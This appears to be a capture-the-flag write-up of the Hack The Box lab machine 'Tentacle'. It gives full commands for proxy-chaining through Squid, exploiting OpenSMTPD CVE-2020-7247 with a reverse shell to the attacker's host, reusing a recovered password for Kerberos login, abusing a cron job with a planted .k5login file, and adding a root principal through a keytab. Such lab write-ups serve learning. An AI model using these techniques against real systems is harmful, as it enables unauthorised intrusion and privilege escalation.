## Synopsis

Tentacle is a Hard linux machine featuring a Squid proxy server. Bypassing Squid proxy authentication
reveals a host which is making use of a vulnerable OpenSMTPD service. Initial foothold can be achieved by
the exploitation of it. A SMTP client configuration file discloses a password which assists in generating a
valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to
escalate to another user who has privileges to add root user to Kerberos principals. This gives us a root
shell.

## Reconaissance

### Squid Proxy
found the squid proxy, reveal an email and domain; let's aded REALCORP.HTB into hosts file.

![](/assets/img/tentacle/1.png)


```text
j.nakazawa@realcorp.htb
```

### DNS
im gonna enumerate domain with `dnsenum` tools for finding another domain

```bash
dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb -u z -v
```

![](/assets/img/tentacle/7.png)


find WPAD for sub domain, so basiclly Web Proxy Auto Discovery(WPAD) protocol is a method used by clients to locate the URL of configuration file using dhcp or dns. The following method are commonly implemented:
* wpad
* PAC (Proxy Auto Configuration)

in this case PAC it should in `http://wpad.realcorp.htb/wpad.bat`, we still cannot have an access into internal network; we still tried to make a request thorugh squid proxy.

```bash
curl -s --proxy http://10.10.10.224:3128 http://wpad.realcorp.htb/wpad.bat
```

result:

```html
<p>The following error was encountered while trying to retrieve the URL: <a href="http://wpad.realcorp.htb/wpad.bat">http://wpad.realcorp.htb/wpad.bat</a></p>

<blockquote id="error">
<p><b>Cache Access Denied.</b></p>
</blockquote>

<p>Sorry, you are not currently allowed to request http://wpad.realcorp.htb/wpad.bat from this cache until you have authenticated yourself.</p>
<div id="footer">
<p>Generated Tue, 17 May 2022 19:29:05 GMT by srv01.realcorp.htb (squid/4.11)</p>
<!-- ERR_CACHE_ACCESS_DENIED -->
</div>
```

the request is failling as the proxy server for access wpad because need an authentication, by default squid proxy allowed access to localhost. let's try access 127.0.0.1

![](/assets/img/tentacle/3.png)


the result given us different word `"invalid url"` which mean accessing into localhost dont need an authentication. let use `proxychains` and turn on the dynamic chains for run our traffic through every proxy list.

```bash
#proxychain list
http    10.10.10.224 3128
http    127.0.0.1 3128
```

in additional adding (10.197.243.1 wpad.realcorp.htb) in /etc/hosts file.

accesing wpad with command :

```bash
proxychains curl http://wpad.realcorp.htb/
```

![](/assets/img/tentacle/4.png)


it's also fail, might be for request need the address source (10.197.243.77), append 10.197.243.77 in proxychain list

```bash
#added new proxy list
http    10.197.243.77 3128
```

reuse command `curl` will retrieve forbidden access 

![](/assets/img/tentacle/5.png)


tried to grab PAC file

![](/assets/img/tentacle/6.png)


squid proxy only accepting traffic with these address, let's enumerate both ip beside they use /24 which mean there is 254 hosts.
`10.197.243.0` and `10.241.251.0`

use `dig` command for with `-x` for reverse dns lookup, during the loop process i make them into output for analyze

```bash
for i in range {1..254}; do dig -x 10.197.243.$i @10.10.10.224 >> dig1; done
```

```bash
for i in range {1..254}; do dig -x 10.241.251.$i @10.10.10.224 >> dig2; done
```

![](/assets/img/tentacle/8.png)

get `srvpod01` for new domain with ip address `10.241.251.113`

![](/assets/img/tentacle/9.png)


## Escalate J.Nakazawa
using nmap will retrieve an information if smtp was open

```bash
proxychains -q nmap -sT -Pn -p 25 10.241.251.113
```

![](/assets/img/tentacle/31.png)


This SMPT version affected of [CVE-2020-7247 - Remote Code Execution](https://raw.githubusercontent.com/QTranspose/CVE-2020-7247-exploit/main/exploit.py). We can easily gaining access into system with following command :

```bash
proxychains -q python3 exploit.py 10.241.251.113 25 10.10.14.8 9000 'j.nakazawa@realcorp.htb'
```

![](/assets/img/tentacle/11.png)

During the enumeration i found hidden file with name `.msmtprc` contains password for j.nakazawa.

![](/assets/img/tentacle/12.png)

Try login via ssh as j.nakazawa will retrieve unfamiliar output (gssapi-keyex,gssapi-with-mic,password).

![](/assets/img/tentacle/14.png)


research about that and lead me into this [aws-page](https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html) and [Kerberos on SSHD](https://cwiki.apache.org/confluence/display/DIRxINTEROP/Kerberos+Authentication+to+SSHD).
it is possible to login via ssh using ticket granting tikcet (TGT),  before doing request ticket we need to configure realm in /etc/krb5.conf. in this [document](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html), they telling us how to iniate kerberos.

here's my krb5.conf file:

```bash
[libdefaults]
	default_realm = REALCORP.HTB

	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	fcc-mit-ticketflags = true

[realms]
#tentacle
#https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/configuring_a_kerberos_5_server
REALCORP.HTB = {
	kdc = srv01.realcorp.htb:88
}

[domain_realms]
	srv01.realcorp.htb = REALCORP.HTB
```

for avoid issue during process we just simply added (10.10.10.224 srv01.realcorp.htb) into host file, and according to this [page](https://intra.kth.se/en/it/arbeta-pa-distans/unix/windows-1.971211) we need to change the configuration ssh file:

```bash
#nano /etc/ssh/sshd_config
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes

#restart service
systemctl restart ssh
```

![](/assets/img/tentacle/18.png)


from now we can request ticket-granting-ticket (TGT) using `kinit` with following command:

```bash
#matching time with Domain Controller
ntpdate 10.10.10.224

#request TGT
echo "sJB}RM>6Z~64_" | kinit j.nakazawa

#for listing ticket
klist
```

![](/assets/img/tentacle/19.png)


as you can see we able to create ticket, and log in into ssh with following command:

```bash
ssh -K j.nakazawa@10.10.10.224
````

![](/assets/img/tentacle/20.png)


## Escalate admin

during the enumeration process, i found cronjob running bash script in every minute

![](/assets/img/tentacle/21.png)


review code log_backup.sh:

```bash
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

the script copy all files from `/var/log/squid` folder to `/home/admin` folder, then create an archive to `squid_logs.tar.gz` and remove access.log and cache.log; After all, we are members of Squid itself.

![](/assets/img/tentacle/23.png)

according [kerberos-documentation](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_config/k5login.html) and [this article](https://fermi.servicenowservices.com/kb_view.do?sysparm_article=KB0012402), we can login into `admin` user only put `.k5login` file into `/var/log/squid/` directory, `.k5login` file should contain `j.nakazawa`, and after that let `cronjob` do their jobs. 

```bash
echo "j.nakazawa@REALCORP.HTB" >> /var/log/squid/.k5login
```

as soon we can try to login via ssh using `admin` as user

![](/assets/img/tentacle/24.png)


## Privilege Escalation

focus on `/etc/keytab` file; in short keytab can be crated or appended to by extracting keys from KDC using `kadmin` command and can be manipulated too with ktutil and k5srvutil.

![](/assets/img/tentacle/25.png)

before using `kadmin` command, you can listing principal with following command:

```bash
klist -kt
```

![](/assets/img/tentacle/27.png)

accessing `kadmin` with keytab file and principal with prompt:

```bash
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

create root user using `ank` command and given password (double) and we need to check if we success or not using `list_pricipals` command.

![](/assets/img/tentacle/28.png)


in kerberos we can execute command `ksu` for switch user into root
